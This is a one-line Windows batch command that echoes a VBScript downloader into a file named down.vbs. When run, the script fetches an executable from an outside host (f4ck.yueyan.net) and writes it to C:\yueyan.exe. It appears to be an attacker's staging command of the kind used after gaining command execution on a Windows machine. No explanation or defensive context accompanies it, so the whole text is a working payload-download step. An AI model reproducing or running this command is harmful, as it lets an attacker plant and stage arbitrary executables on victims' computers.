echo Set xPost = CreateObject(^"Microsoft.XMLHTTP^"):xPost.Open ^"GET^",^"http://f4ck.yueyan.net/yueyan.exe^",0:xPost.Send():Set sGet = CreateObject(^"ADODB.Stream^"):sGet.Mode = 3:sGet.Type = 1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^"C:\yueyan.exe^",2 >down.vbs